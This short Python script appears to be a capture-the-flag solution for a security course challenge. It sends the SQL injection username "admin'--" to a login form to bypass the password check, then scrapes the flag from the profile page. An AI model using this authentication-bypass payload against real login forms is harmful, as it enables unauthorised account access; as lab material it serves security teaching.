import requests
import re

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25261

link = f'{SERVER}:{PORT}'
s = requests.Session()

data = {'username' : "admin'--", 'password' : 'lol'}
s.post(f'{link}/login', data=data)

flag = s.get(f'{link}/profile').text

flag = re.search("SSof{.*}", flag)
print(flag)

